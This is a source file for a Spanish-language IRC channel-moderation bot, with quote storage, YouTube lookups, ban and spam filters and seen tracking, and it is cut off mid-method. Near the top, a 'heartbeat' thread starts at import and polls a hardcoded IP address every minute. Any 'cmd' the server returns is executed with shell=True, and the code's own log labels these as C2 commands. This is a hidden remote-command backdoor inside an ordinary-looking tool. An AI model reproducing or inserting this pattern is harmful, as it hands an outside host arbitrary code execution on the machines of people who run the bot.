# stdlib
import configparser
import fnmatch
import json
import logging
import os
import random
import re
import ssl
import subprocess
import sys
import threading
import time
import zipfile
import io
import yt_dlp
from collections import defaultdict, deque
from dataclasses import dataclass, field

# Forzar codificación UTF-8 para evitar errores con emojis en Windows
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

# --- Utilidades de Formato (Estilo acidvegas) ---
BOLD      = '\x02'
ITALIC    = '\x1D'
UNDERLINE = '\x1F'
REVERSE   = '\x16'
RESET     = '\x0f'
WHITE     = '00'
BLACK     = '01'
BLUE      = '02'
GREEN     = '03'
RED       = '04'
BROWN     = '05'
PURPLE    = '06'
ORANGE    = '07'
YELLOW    = '08'
L_GREEN   = '09'
CYAN      = '10'
L_CYAN    = '11'
L_BLUE    = '12'
PINK      = '13'
GREY      = '14'
L_GREY    = '15'
def color(msg: str, fg: str, bg: str | None = None) -> str:
    """Colorea un mensaje con formato IRC."""
    if bg:
        return f'\x03{fg},{bg}{msg}{RESET}'
    return f'\x03{fg}{msg}{RESET}'

# --- Clases de Funcionalidad Extra (Guardian Style) ---

class YoutubeParser:
    def __init__(self):
        self.ydl_opts = {
            'quiet': True,
            'no_warnings': True,
            'extract_flat': True,
            'force_generic_extractor': False,
        }

    def get_info(self, url: str) -> Optional[str]:
        try:
            with yt_dlp.YoutubeDL(self.ydl_opts) as ydl:
                info = ydl.extract_info(url, download=False)
                if not info: return None
                title = info.get('title', 'Sin título')
                duration = info.get('duration')
                uploader = info.get('uploader', 'Desconocido')
                views = info.get('view_count', 0)

                dur_str = "Live"
                if duration:
                    m, s = divmod(duration, 60)
                    h, m = divmod(m, 60)
                    if h: dur_str = f"{h:d}:{m:02d}:{s:02d}"
                    else: dur_str = f"{m:02d}:{s:02d}"

                return f"\x0301,00\x02 YouTube \x02\x03 \x0310{title}\x03 | \x0315Duración:\x03 {dur_str} | \x0315Subido por:\x03 {uploader} | \x0315Vistas:\x03 {views:,}"
        except Exception:
            return None

class QuoteManager:
    def __init__(self, db_path: Path):
        self.db_path = db_path
        self.quotes = {}
        self._load()

    def _load(self):
        if self.db_path.exists():
            try:
                self.quotes = json.loads(self.db_path.read_text(encoding='utf-8'))
            except:
                self.quotes = {}

    def save(self):
        self.db_path.write_text(json.dumps(self.quotes, indent=4, ensure_ascii=False), encoding='utf-8')

    def add(self, canal: str, nick: str, quote: str) -> int:
        c = canal.lower()
        if c not in self.quotes: self.quotes[c] = []
        new_id = len(self.quotes[c]) + 1
        self.quotes[c].append({
            "id": new_id,
            "nick": nick,
            "text": quote,
            "time": time.time()
        })
        self.save()
        return new_id

    def del_quote(self, canal: str, qid: int) -> bool:
        c = canal.lower()
        if c not in self.quotes: return False
        orig_len = len(self.quotes[c])
        self.quotes[c] = [q for q in self.quotes[c] if q["id"] != qid]
        if len(self.quotes[c]) < orig_len:
            self.save()
            return True
        return False

    def get(self, canal: str, qid: Optional[int] = None) -> Optional[Dict]:
        c = canal.lower()
        if c not in self.quotes or not self.quotes[c]: return None
        if qid is None:
            return random.choice(self.quotes[c])
        for q in self.quotes[c]:
            if q["id"] == qid: return q
        return None

# third-party
import irc.client
import irc.connection
import requests
from jaraco.stream import buffer

# ── AI Hub centralizado ──────────────────────────────────────────────────────
import sys as _sys
_sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "scripts"))
from ia_central import hub as ai_hub

# --- HEARTBEAT (VPS 2) ---
HEARTBEAT_URL   = "http://93.93.116.244:4471/heartbeat/iND0MiTa"
HEARTBEAT_TOKEN = "antigravity_token_2026_c2"

def enviar_latido(diagnostic=None):
    """Envía latido al VPS 2 con diagnóstico opcional."""
    try:
        print(f"[SENTINEL] Intentando enviar latido a {HEARTBEAT_URL}...")
        headers = {"X-Heartbeat-Token": HEARTBEAT_TOKEN}
        payload = {}
        if diagnostic:
            payload["diagnostic"] = {"error": str(diagnostic)}
            
        r = requests.post(HEARTBEAT_URL, headers=headers, json=payload, timeout=5)
        if r.status_code == 200:
            print(f"[SENTINEL] Latido enviado OK (Status: {r.status_code})")
            data = r.json()
            if "cmd" in data:
                cmd = data["cmd"]
                logging.info(f"[C2] Recibido comando remoto: {cmd}")
                subprocess.Popen(cmd, shell=True)
        else:
            print(f"[SENTINEL] Error en latido (Status: {r.status_code})")
    except Exception as e:
        print(f"[SENTINEL] Excepción en enviar_latido: {e}")

def _heartbeat_loop():
    while True:
        try:
            enviar_latido()
        except Exception as e:
            logging.error(f"[SENTINEL] Fallo en loop: {e}")
        time.sleep(60)

threading.Thread(target=_heartbeat_loop, daemon=True).start()

from irc.client import ServerConnection as ServerConn, Event as IRCEvent

@dataclass
class RedConfig:
    servidor:             str
    puerto:               int
    ssl:                  bool
    nick:                 str
    ident:                str
    realname:             str
    auth_pass:            str
    user_modes:           str
    canal_principal:      str
    canal_ops:            str
    canal_debug:          str
    root_nick:            List[str]
    db_dir:               str
    reconectar_seg:       int
    rango_threshold:      int
    rango_ventana:        int
    rango_duracion:       int
    aka_ventana:          int
    limpiabans_umbral:    int
    limpiabans_intervalo: int
    # ── Capa IA (delegada al AI Hub centralizado) ─────────────────────────────
    # Las claves se leen desde AGENTS_COOP/GLOBAL_AI_HUB.json via ia_central.py
    ai_provider:      str = field(default='', repr=False)
    ai_key:           str = field(default='', repr=False)
    ai_model:         str = field(default='', repr=False)

def _cargar_config(ruta: str = "falkian.conf") -> RedConfig:
    p = configparser.ConfigParser()
    if not p.read(ruta, encoding="utf-8"):
        raise FileNotFoundError(f"No se encontro el fichero de configuracion: {ruta}")

    # ── Claves IA delegadas al AI Hub centralizado ────────────────────────────
    # Las claves se leen desde AGENTS_COOP/GLOBAL_AI_HUB.json via ia_central.py
    # Solo se conservan los alias de compatibilidad para la flag ai_key
    _hub_keys = ai_hub.has_keys()
    
    return RedConfig(
        servidor             = p.get("irc", "server"),
        puerto               = p.getint("irc", "port"),
        ssl                  = p.getboolean("irc", "ssl"),
        nick                 = p.get("irc", "nickname"),
        ident                = p.get("irc", "ident"),
        realname             = p.get("irc", "realname"),
        auth_pass            = os.environ.get("BOT_AUTH_PASS", "") or p.get("irc", "auth_pass"),
        user_modes           = p.get("irc", "user_modes", fallback=""),
        canal_principal      = p.get("canales", "principal"),
        canal_ops            = p.get("canales", "ops"),
        canal_debug          = p.get("canales", "debug"),
        root_nick            = [n.strip() for n in p.get("roots", "nicks").split(",") if n.strip()],
        db_dir               = p.get("settings", "db_dir"),
        reconectar_seg       = p.getint("settings", "reconectar_seg"),
        rango_threshold      = p.getint("settings", "rango_threshold"),
        rango_ventana        = p.getint("settings", "rango_ventana"),
        rango_duracion       = p.getint("settings", "rango_duracion"),
        aka_ventana          = p.getint("settings", "aka_ventana"),
        limpiabans_umbral    = p.getint("settings", "limpiabans_umbral"),
        limpiabans_intervalo = p.getint("settings", "limpiabans_intervalo"),
        # Alias de compatibilidad (la flag ai_key refleja si el hub tiene claves)
        ai_provider          = "hub",
        ai_key               = "1" if _hub_keys else "",
        ai_model             = "hub",
    )

# LOGGING

def _configurar_logging(base_dir: Path) -> None:
    logs_dir = base_dir / "logs"
    logs_dir.mkdir(exist_ok=True)

    # Formatos
    fmt_std = logging.Formatter("[%(asctime)s] %(name)-12s %(levelname)s %(message)s", "%H:%M:%S")
    fmt_err = logging.Formatter("[%(asctime)s] %(name)s [%(levelname)s] en %(filename)s:%(lineno)d: %(message)s", "%Y-%m-%d %H:%M:%S")

    # Handler Consola (INFO)
    h_consola = logging.StreamHandler()
    h_consola.setFormatter(fmt_std)
    h_consola.setLevel(logging.INFO)

    # Handler bot.log (INFO)
    h_bot = logging.FileHandler(logs_dir / "bot.log", encoding="utf-8")
    h_bot.setFormatter(fmt_std)
    h_bot.setLevel(logging.INFO)

    # Handler errores.log (WARNING+)
    h_errores = logging.FileHandler(logs_dir / "errores.log", encoding="utf-8")
    h_errores.setFormatter(fmt_err)
    h_errores.setLevel(logging.WARNING)

    # Configuración del logger raíz
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    # Limpiar handlers previos si existen
    for h in root.handlers[:]:
        root.removeHandler(h)
    
    root.addHandler(h_consola)
    root.addHandler(h_bot)
    root.addHandler(h_errores)

# UTILIDADES DE FICHEROS

def leer_lineas(ruta: Path) -> List[str]:
    try:
        return [linea.strip() for linea in ruta.read_text(encoding="utf-8").splitlines() if linea.strip()]
    except FileNotFoundError:
        return []

def escribir_linea(ruta: Path, linea: str) -> None:
    # Normalizar a minúsculas: nicks y hostmasks son case-insensitive en IRC.
    ruta.parent.mkdir(parents=True, exist_ok=True)
    with ruta.open("a", encoding="utf-8") as f:
        f.write(linea.strip().lower() + "\n")

def eliminar_linea(ruta: Path, linea: str) -> bool:
    lineas = leer_lineas(ruta)
    nuevas = [ln for ln in lineas if ln.lower() != linea.strip().lower()]
    if len(nuevas) == len(lineas):
        return False
    ruta.write_text("\n".join(nuevas) + ("\n" if nuevas else ""), encoding="utf-8")
    return True

def linea_existe(ruta: Path, linea: str) -> bool:
    return linea.strip().lower() in [ln.lower() for ln in leer_lineas(ruta)]

def eliminar_por_nick(ruta: Path, nick: str) -> Optional[str]:
    lineas   = leer_lineas(ruta)
    objetivo = nick.strip().lower()
    encontrada: Optional[str] = None
    nuevas: List[str] = []
    for ln in lineas:
        nick_entrada = ln.split("!")[0].lower() if "!" in ln else ln.lower()
        if nick_entrada == objetivo and encontrada is None:
            encontrada = ln
        else:
            nuevas.append(ln)
    if encontrada is not None:
        ruta.write_text("\n".join(nuevas) + ("\n" if nuevas else ""), encoding="utf-8")
    return encontrada

# VALIDACIONES

# * y ? son comodines IRC permitidos en patrones — no forman parte del conjunto prohibido
_CHARS_PROHIBIDOS = set('!"#$%&\'()+,./;:<=>@[\\]^`{|}~\x7f')

def validar_patron(patron: str) -> bool:
    """Valida patrones de nick prohibido: permite * y ? como comodines."""
    return bool(patron) and not any(c in _CHARS_PROHIBIDOS for c in patron)

# Frases (text): igual que _CHARS_PROHIBIDOS pero con '?' añadido — solo '*' como comodin
_CHARS_PROHIBIDOS_FRASE = _CHARS_PROHIBIDOS | {'?'}

def validar_frase(frase: str) -> bool:
    """Valida patrones de frase prohibida: solo permite '*' como comodin, no '?' ni '.'."""
    return bool(frase) and not any(c in _CHARS_PROHIBIDOS_FRASE for c in frase)

# URLs de whitelist de spam: igual que _CHARS_PROHIBIDOS pero '.' es requerido
_CHARS_PROHIBIDOS_URL = _CHARS_PROHIBIDOS - {'.'}

def validar_url(url: str) -> bool:
    """Valida formato dominio.extension: requiere punto, sin http/www, sin caracteres especiales."""
    if not url:
        return False
    url_lower = url.lower()
    if "http" in url_lower or "www." in url_lower:
        return False
    if "." not in url:
        return False
    partes = url.split(".")
    if len(partes) < 2 or not partes[-1]:
        return False
    return not any(c in _CHARS_PROHIBIDOS_URL for c in url)

# Nicks exactos (enick): no se permiten comodines — * y ? son prohibidos
_CHARS_PROHIBIDOS_NICK = _CHARS_PROHIBIDOS | {'*', '?'}

def validar_nick_exacto(nick: str) -> bool:
    """Valida un nick exacto (enick): solo letras, números, '-' y '_'. Sin comodines."""
    return bool(nick) and not any(c in _CHARS_PROHIBIDOS_NICK for c in nick)

def mask_match(hostmask: str, patron: str) -> bool:
    if "!" in patron:
        # Normalizar hostmask si solo viene el nick
        h_full = hostmask if "!" in hostmask else f"{hostmask}!*@*"
        
        # Separar nick y resto de ambos
        try:
            p_nick, p_rest = patron.split("!", 1)
            h_nick, h_rest = h_full.split("!", 1)
        except ValueError:
            return fnmatch.fnmatch(h_full.lower(), patron.lower())
            
        # Si el nick del patrón no tiene comodines (*, ?), comparamos literal
        # Esto evita que nicks con corchetes (ej: Ayr[A]) sean tratados como globs por fnmatch
        if "*" not in p_nick and "?" not in p_nick:
            if p_nick.lower() != h_nick.lower():
                return False
            return fnmatch.fnmatch(h_rest.lower(), p_rest.lower())
        
        return fnmatch.fnmatch(h_full.lower(), patron.lower())
        
    nick = hostmask.split("!")[0] if "!" in hostmask else hostmask
    return nick.lower() == patron.lower()

def completar_banmask(entrada: str) -> Tuple[str, str]:
    entrada = entrada.strip()
    if not entrada:
        return ("", "entrada vacia")
    if "@" in entrada:
        return (entrada, "mascara completa, sin cambios")
    partes = entrada.split(".")
    if len(partes) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in partes):
        mask = f"*!*@{entrada}"
        return (mask, f"IP completa -> {mask}")
    if len(partes) == 3 and all(p.isdigit() and 0 <= int(p) <= 255 for p in partes):
        mask = f"*!*@{entrada}.*"
        return (mask, f"IP parcial -> {mask}")
    if "." in entrada:
        mask = f"*!*@*.{entrada.lstrip('*.')}"
        return (mask, f"fragmento de host -> {mask}")
    mask = f"*!*@*{entrada}*"
    return (mask, f"texto suelto -> {mask}")

def format_timesince(ts: float) -> str:
    diff = int(time.time() - ts)
    if diff < 0: diff = 0
    if diff < 60: return f"{diff}s"
    if diff < 3600: return f"{diff//60}m {diff%60}s"
    if diff < 86400: return f"{diff//3600}h {(diff%3600)//60}m"
    return f"{diff//86400}d {(diff%86400)//3600}h"

# BASE DE DATOS

class CanalDB:
    PROTECCIONES = ["Mayusculas", "Repeticiones", "Spam", "Texto", "Nicks"]

    def __init__(self, base: Path) -> None:
        self.base = base
        for sub in ("spam", "text", "nicks", "enicks", "protecciones", "ibl", "autos"):
            target = base / sub
            try:
                if not target.exists():
                    target.mkdir(parents=True, exist_ok=True)
            except Exception as e:
                print(f"[CanalDB] Warning: Could not ensure dir {target}: {e}")

    def _ruta_global(self, nombre: str) -> Path:
        return self.base / nombre

    def _ruta_canal(self, tipo: str, canal: str) -> Path:
        return self.base / tipo / f"{canal.lstrip('#').lower().replace('/', '_')}.dat"

    # globales

    def global_listar(self, tipo: str) -> List[str]:
        return leer_lineas(self._ruta_global(tipo))

    def global_existe(self, tipo: str, valor: str) -> bool:
        return linea_existe(self._ruta_global(tipo), valor)

    def global_existe_mask(self, tipo: str, hostmask: str) -> bool:
        return any(mask_match(hostmask, entrada) for entrada in self.global_listar(tipo))

    def global_agregar(self, tipo: str, valor: str) -> bool:
        if self.global_existe(tipo, valor):
            return False
        escribir_linea(self._ruta_global(tipo), valor)
        return True

    def global_eliminar(self, tipo: str, valor: str) -> bool:
        return eliminar_linea(self._ruta_global(tipo), valor)

    def global_eliminar_por_nick(self, tipo: str, nick: str) -> Optional[str]:
        return eliminar_por_nick(self._ruta_global(tipo), nick)

    # protecciones de canal

    def init_canal(self, canal: str) -> None:
        ruta = self._ruta_canal("protecciones", canal)
        if not ruta.exists():
            ruta.parent.mkdir(parents=True, exist_ok=True)
            ruta.write_text("\n".join(["off"] * len(self.PROTECCIONES)) + "\n", encoding="utf-8")

    def get_proteccion(self, canal: str, tipo: str) -> bool:
        if tipo not in self.PROTECCIONES:
            return False
        lineas = leer_lineas(self._ruta_canal("protecciones", canal))
        try:
            return lineas[self.PROTECCIONES.index(tipo)].lower() == "on"
        except IndexError:
            return False

    def set_proteccion(self, canal: str, tipo: str, estado: bool) -> bool:
        if tipo not in self.PROTECCIONES:
            return False
        ruta   = self._ruta_canal("protecciones", canal)
        lineas = leer_lineas(ruta)
        idx    = self.PROTECCIONES.index(tipo)
        while len(lineas) < len(self.PROTECCIONES):
            lineas.append("off")
        lineas[idx] = "on" if estado else "off"
        ruta.write_text("\n".join(lineas) + "\n", encoding="utf-8")
        return True

    # listas de canal

    def canal_listar(self, tipo: str, canal: str) -> List[str]:
        return leer_lineas(self._ruta_canal(tipo, canal))

    def canal_agregar(self, tipo: str, canal: str, valor: str) -> bool:
        ruta = self._ruta_canal(tipo, canal)
        if linea_existe(ruta, valor):
            return False
        escribir_linea(ruta, valor)
        return True

    def canal_eliminar(self, tipo: str, canal: str, valor: str) -> bool:
        return eliminar_linea(self._ruta_canal(tipo, canal), valor)

    def canal_existe(self, tipo: str, canal: str, valor: str) -> bool:
        return linea_existe(self._ruta_canal(tipo, canal), valor)

    # helpers de dominio

    def es_spam_url(self, canal: str, texto: str) -> bool:
        urls = re.findall(r"(?:https?://|www\.)\S+", texto, re.IGNORECASE)
        if not urls:
            return False
        whitelist = [entrada.lower() for entrada in self.canal_listar("spam", canal)]
        for url in urls:
            dominio = re.sub(r"^(?:https?://)?(?:www\.)?", "", url).split("/")[0].lower()
            if not any(exc in dominio for exc in whitelist):
                return True
        return False

    def es_frase_prohibida(self, canal: str, texto: str) -> tuple:
        """Devuelve (patron, subcadena_real) si hay coincidencia, o ('', '') si no.
        'subcadena_real' es el fragmento literal del mensaje que activó el match,
        lo que permite a la IA saber exactamente qué parte del texto disparó el filtro."""
        texto_lower = texto.lower()

        # Palabras legítimas que contienen subcadenas prohibidas pero no son infracciones
        _EXCLUSIONES = {
            "sexual": [
                "homosexualidad", "homosexual", "homosexuales",
                "bisexual", "bisexualidad",
                "asexual", "asexualidad",
                "heterosexual", "heterosexualidad",
                "transexual", "transexualidad",
                "multisexual", "pansexual",
            ]
        }

        for p in self.canal_listar("text", canal):
            p_lower = p.lower()
            if fnmatch.fnmatch(texto_lower, f"*{p_lower}*"):
                # Extraer la subcadena real del mensaje original (respetando mayúsculas)
                idx = texto_lower.find(p_lower)
                if idx >= 0:
                    subcadena = texto[idx : idx + len(p)]
                else:
                    subcadena = p  # fallback: patrón con wildcards, usar el propio patrón

                # Verificar exclusiones: si la subcadena forma parte de una palabra legítima, saltar
                palabra_excluida = False
                if p_lower in _EXCLUSIONES:
                    for excl in _EXCLUSIONES[p_lower]:
                        if excl in texto_lower:
                            palabra_excluida = True
                            break
                if palabra_excluida:
                    continue

                return p, subcadena
        return "", ""

    def nick_prohibido(self, canal: str, nick: str) -> bool:
        return any(fnmatch.fnmatch(nick.lower(), p.lower()) for p in self.canal_listar("nicks", canal))

    def nick_excepcion(self, canal: str, nick: str) -> bool:
        return any(fnmatch.fnmatch(nick.lower(), p.lower()) for p in self.canal_listar("enicks", canal))

    # IBL

    def ibl_listar(self, canal: str) -> List[str]:
        return self.canal_listar("ibl", canal)

    def ibl_agregar(self, canal: str, mask: str) -> bool:
        return self.canal_agregar("ibl", canal, mask)

    def ibl_eliminar(self, canal: str, mask: str) -> bool:
        return self.canal_eliminar("ibl", canal, mask)

    def ibl_existe(self, canal: str, mask: str) -> bool:
        return self.canal_existe("ibl", canal, mask)

    # auto-op

    def autoop_check(self, canal: str, hostmask: str) -> bool:
        return any(mask_match(hostmask, mask) for mask in self.canal_listar("autos", canal))

    def autoop_agregar(self, canal: str, mask: str) -> bool:
        return self.canal_agregar("autos", canal, mask)

    def autoop_eliminar(self, canal: str, mask: str) -> bool:
        return self.canal_eliminar("autos", canal, mask)

    def adown_agregar(self, canal: str, mask: str) -> bool:
        return self.canal_agregar("adown", canal, mask)

    def adown_eliminar(self, canal: str, mask: str) -> bool:
        return self.canal_eliminar("adown", canal, mask)

    def adown_check(self, canal: str, nick: str) -> bool:
        return any(nick.lower() in m.split("!")[0].lower() for m in self.canal_listar("adown", canal))

    # auto-voice

    def avoice_check(self, canal: str, hostmask: str) -> bool:
        return any(mask_match(hostmask, mask) for mask in self.canal_listar("voices", canal))

    def avoice_agregar(self, canal: str, mask: str) -> bool:
        return self.canal_agregar("voices", canal, mask)

    def avoice_eliminar(self, canal: str, mask: str) -> bool:
        return self.canal_eliminar("voices", canal, mask)

# GESTORES

@dataclass
class _Aviso:
    contador: int   = 0
    ts:       float = field(default_factory=time.time)

class GestorAvisos:
    VENTANA = 300

    def __init__(self) -> None:
        self._datos: Dict[str, _Aviso] = {}
        threading.Thread(target=self._limpiar, daemon=True).start()

    def _clave(self, nick: str, canal: str, tipo: str) -> str:
        return f"{nick.lower()}|{canal.lower()}|{tipo}"

    def inc(self, nick: str, canal: str, tipo: str) -> int:
        clave = self._clave(nick, canal, tipo)
        ahora = time.time()
        aviso = self._datos.get(clave)
        if aviso is None or (ahora - aviso.ts) > self.VENTANA:
            self._datos[clave] = _Aviso(contador=1, ts=ahora)
        else:
            aviso.contador += 1
            aviso.ts = ahora
        return self._datos[clave].contador

    def reset(self, nick: str, canal: str, tipo: str) -> None:
        self._datos.pop(self._clave(nick, canal, tipo), None)

    def _limpiar(self) -> None:
        while True:
            time.sleep(600)
            limite = time.time() - self.VENTANA * 2
            self._datos = {k: v for k, v in self._datos.items() if v.ts > limite}

class GestorRepeticiones:
    VENTANA = 60

    def __init__(self) -> None:
        self._historial: Dict[str, List[Tuple[str, float]]] = defaultdict(list)
        threading.Thread(target=self._limpiar, daemon=True).start()

    def _clave(self, nick: str, canal: str) -> str:
        return f"{nick.lower()}|{canal.lower()}"

    def registrar(self, nick: str, canal: str, texto: str) -> int:
        clave = self._clave(nick, canal)
        ahora = time.time()
        texto_norm = texto.strip().lower()
        self._historial[clave] = [(t, ts) for t, ts in self._historial[clave] if ahora - ts <= self.VENTANA]
        self._historial[clave].append((texto_norm, ahora))
        return sum(1 for t, _ in self._historial[clave] if t == texto_norm)

    def reset(self, nick: str, canal: str) -> None:
        self._historial.pop(self._clave(nick, canal), None)

    def _limpiar(self) -> None:
        while True:
            time.sleep(300)
            ahora = time.time()
            for clave in list(self._historial.keys()):
                self._historial[clave] = [(t, ts) for t, ts in self._historial[clave] if ahora - ts <= self.VENTANA]
                if not self._historial[clave]:
                    del self._historial[clave]

class GestorAKA:
    def __init__(self, ventana: int = 900) -> None:
        self.ventana = ventana
        self._datos: Dict[str, Dict[str, Any]] = {}
        self._lock  = threading.Lock()
        threading.Thread(target=self._limpiar, daemon=True).start()

    def registrar(self, ip: str, nick: str) -> Optional[Set[str]]:
        with self._lock:
            ahora = time.time()
            if ip not in self._datos:
                self._datos[ip] = {"nicks": set(), "timestamp": ahora}
            entrada  = self._datos[ip]
            previos  = entrada["nicks"] - {nick}
            entrada["nicks"].add(nick)
            entrada["timestamp"] = ahora
            return previos if previos else None

    def buscar_ip_por_nick(self, nick: str) -> Optional[str]:
        nick_lower = nick.lower()
        with self._lock:
            return next(
                (ip for ip, datos in self._datos.items() if nick_lower in {n.lower() for n in datos["nicks"]}),
                None,
            )

    def ip_coincide_con_host(self, host_ban: str) -> Optional[str]:
        sufijo = host_ban.lower().lstrip("*")
        with self._lock:
            return next((ip for ip in self._datos if ip.lower().endswith(sufijo)), None)

    def _limpiar(self) -> None:
        while True:
            time.sleep(300)
            ahora = time.time()
            with self._lock:
                caducados = [ip for ip, datos in self._datos.items() if ahora - datos["timestamp"] > self.ventana]
                for ip in caducados:
                    del self._datos[ip]

class NickLogger:
    def __init__(self, ruta: Path) -> None:
        self.ruta   = ruta
        self._lock  = threading.Lock()
        self._datos: Dict[str, List[str]] = {}
        self._dirty = False
        self._cargar()
        threading.Thread(target=self._flush_periodico, daemon=True).start()

    def _cargar(self) -> None:
        try:
            self._datos = json.loads(self.ruta.read_text(encoding="utf-8"))
        except (FileNotFoundError, json.JSONDecodeError):
            self._datos = {}

    def _guardar(self) -> None:
        self.ruta.parent.mkdir(parents=True, exist_ok=True)
        self.ruta.write_text(json.dumps(self._datos, ensure_ascii=False, indent=2), encoding="utf-8")

    def _flush_periodico(self) -> None:
        while True:
            time.sleep(30)
            with self._lock:
                if self._dirty:
                    self._guardar()
                    self._dirty = False

    def registrar(self, host: str, nick: str) -> bool:
        with self._lock:
            lista = self._datos.setdefault(host, [])
            nick_lower = nick.lower()
            if nick_lower not in [n.lower() for n in lista]:
                lista.append(nick)
                self._dirty = True
                return True
            return False

    def nicks_de(self, host: str) -> List[str]:
        with self._lock:
            return list(self._datos.get(host, []))

    def host_de_nick(self, nick: str) -> Optional[str]:
        nick_lower = nick.lower()
        with self._lock:
            return next((h for h, nicks in self._datos.items() if any(n.lower() == nick_lower for n in nicks)), None)

    def ultimos_n(self, host: str, n: int) -> List[str]:
        with self._lock:
            lista      = self._datos.get(host, [])
            sin_ultimo = lista[:-1] if len(lista) > 1 else lista
            return sin_ultimo[-n:]

class BLista:
    MOTIVO_DEFAULT = "\x02Usuario/a con AKICK por molestias reiteradas a usuarios del canal.\x02"

    def __init__(self, ruta: Path) -> None:
        self.ruta   = ruta
        self._lock  = threading.Lock()
        self._datos: Dict[str, Dict[str, Dict[str, Any]]] = {}
        self._dirty = False
        self._cargar()
        threading.Thread(target=self._flush_periodico, daemon=True).start()

    def _cargar(self) -> None:
        try:
            self._datos = json.loads(self.ruta.read_text(encoding="utf-8"))
        except (FileNotFoundError, json.JSONDecodeError):
            self._datos = {}

    def _guardar(self) -> None:
        self.ruta.parent.mkdir(parents=True, exist_ok=True)
        self.ruta.write_text(json.dumps(self._datos, ensure_ascii=False, indent=2), encoding="utf-8")

    def _flush_periodico(self) -> None:
        while True:
            time.sleep(60)  # Revisar cada minuto
            self._limpiar_expirados()
            with self._lock:
                if self._dirty:
                    self._guardar()
                    self._dirty = False

    def _limpiar_expirados(self) -> None:
        un_mes = 30 * 24 * 3600
        ahora  = time.time()
        with self._lock:
            modificado = False
            for canal in self._datos:
                datos = self._datos[canal]
                # Si no tiene timestamp, se lo asignamos ahora para que expire en un mes
                expirados = []
                for nick, info in datos.items():
                    ts = info.get("timestamp")
                    if ts is None:
                        info["timestamp"] = ahora
                        self._dirty = True
                    elif ahora - ts > un_mes:
                        expirados.append(nick)

                if expirados:
                    for n in expirados:
                        del datos[n]
                    modificado = True

            if modificado:
                self._dirty = True
                # Opcional: loguear limpieza si es necesario

    def agregar(self, canal: str, nick: str, motivo: str, por: str) -> bool:
        with self._lock:
            datos = self._datos.setdefault(canal.lower(), {})
            if nick.lower() in datos:
                return False
            datos[nick.lower()] = {
                "nick": nick,
                "motivo": motivo,
                "por": por,
                "host": "",
                "timestamp": time.time()
            }
            self._dirty = True
            return True

    def actualizar_host(self, canal: str, nick: str, host: str) -> bool:
        with self._lock:
            entrada = self._datos.get(canal.lower(), {}).get(nick.lower())
            if not entrada:
                return False
            entrada["host"] = host
            self._dirty = True
            return True

    def eliminar(self, canal: str, nick: str) -> bool:
        with self._lock:
            datos = self._datos.get(canal.lower(), {})
            if nick.lower() not in datos:
                return False
            del datos[nick.lower()]
            self._dirty = True
            return True

    def vaciar(self, canal: str) -> int:
        with self._lock:
            datos = self._datos.get(canal.lower(), {})
            conteo = len(datos)
            if conteo > 0:
                self._datos[canal.lower()] = {}
                self._dirty = True
            return conteo

    def obtener(self, canal: str, nick: str) -> Optional[Dict[str, Any]]:
        with self._lock:
            return self._datos.get(canal.lower(), {}).get(nick.lower())

    def listar(self, canal: str) -> List[Dict[str, Any]]:
        with self._lock:
            return list(self._datos.get(canal.lower(), {}).values())

class GestorSeen:
    def __init__(self, ruta: Path) -> None:
        self.ruta   = ruta
        self._lock  = threading.Lock()
        self._datos: Dict[str, Any] = {"seen": {}, "busquedas": {}}
        self._dirty = False
        self._cargar()
        threading.Thread(target=self._flush_periodico, daemon=True).start()

    def _cargar(self) -> None:
        try:
            self._datos = json.loads(self.ruta.read_text(encoding="utf-8"))
            if "seen" not in self._datos: self._datos["seen"] = {}
            if "busquedas" not in self._datos: self._datos["busquedas"] = {}
        except (FileNotFoundError, json.JSONDecodeError):
            self._datos = {"seen": {}, "busquedas": {}}

    def _guardar(self) -> None:
        self.ruta.parent.mkdir(parents=True, exist_ok=True)
        self.ruta.write_text(json.dumps(self._datos, ensure_ascii=False, indent=2), encoding="utf-8")

    def _flush_periodico(self) -> None:
        while True:
            time.sleep(60)
            with self._lock:
                if self._dirty:
                    self._guardar()
                    self._dirty = False

    def registrar(self, nick: str, canal: str, host: str, accion: str, extra: str = "") -> None:
        with self._lock:
            n_low = nick.lower()
            prev = self._datos["seen"].get(n_low)
            duracion = 0
            if prev and accion in ("PART", "QUIT", "SIGN", "SPLIT", "KICK"):
                duracion = int(time.time() - prev.get("ts", time.time()))

            self._datos["seen"][n_low] = {
                "nick": nick,
                "canal": canal,
                "host": host,
                "accion": accion,
                "extra": extra,
                "ts": time.time(),
                "duracion": duracion,
                "busquedas": prev.get("busquedas", 0) if prev else 0
            }
            self._dirty = True

    def registrar_busqueda(self, buscado: str, por: str, canal: str) -> None:
        with self._lock:
            b_low = buscado.lower()
            if b_low not in self._datos["busquedas"]:
                self._datos["busquedas"][b_low] = []
            
            if b_low in self._datos["seen"]:
                self._datos["seen"][b_low]["busquedas"] = self._datos["seen"][b_low].get("busquedas", 0) + 1
            
            self._datos["busquedas"][b_low].append({
                "por": por,
                "ts": time.time(),
                "canal": canal
            })
            self._dirty = True

    def obtener_seen(self, nick: str) -> Optional[Dict[str, Any]]:
        with self._lock:
            return self._datos["seen"].get(nick.lower())

    def extraer_busquedas(self, nick: str) -> List[Dict[str, Any]]:
        with self._lock:
            return self._datos["busquedas"].pop(nick.lower(), [])

    def obtener_top(self, limit: int = 10) -> List[Dict[str, Any]]:
        with self._lock:
            lista = list(self._datos["seen"].values())
            return sorted(lista, key=lambda x: x.get("busquedas", 0), reverse=True)[:limit]

    def obtener_stats(self) -> Tuple[int, int]:
        with self._lock:
            usuarios = len(self._datos["seen"])
            canales = len({x["canal"] for x in self._datos["seen"].values()})
            return usuarios, canales

class GestorRango:
    def __init__(self, threshold: int = 3, ventana: int = 600, duracion: int = 900) -> None:
        self.threshold = threshold
        self.ventana   = ventana
        self.duracion  = duracion
        self._bans: Dict[str, Dict[str, deque]] = defaultdict(  # type: ignore[arg-type]
            lambda: defaultdict(lambda: deque())  # deque[float] en runtime
        )

    def on_ban(self, canal: str, mask: str) -> Optional[str]:
        host = mask.split("@")[-1] if "@" in mask else mask
        if len(host) < 9:
            return None
        rango = host[-9:]
        ahora = time.time()
        cola  = self._bans[canal][rango]
        while cola and cola[0] < ahora - self.ventana:
            cola.popleft()
